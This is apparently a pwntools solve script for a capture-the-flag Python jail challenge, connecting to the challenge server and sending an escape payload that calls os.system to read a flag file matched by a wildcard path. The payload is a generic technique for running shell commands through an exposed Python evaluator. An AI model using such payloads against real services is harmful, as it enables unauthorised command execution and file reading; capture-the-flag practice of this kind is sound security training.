# Pyjail-0.5 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5010
context.log_level = "debug"

io = remote(HOST, PORT)

payload = b"__import__('os').system('cat /????.txt')"

io.sendlineafter(b"yourself?", payload)

io.interactive()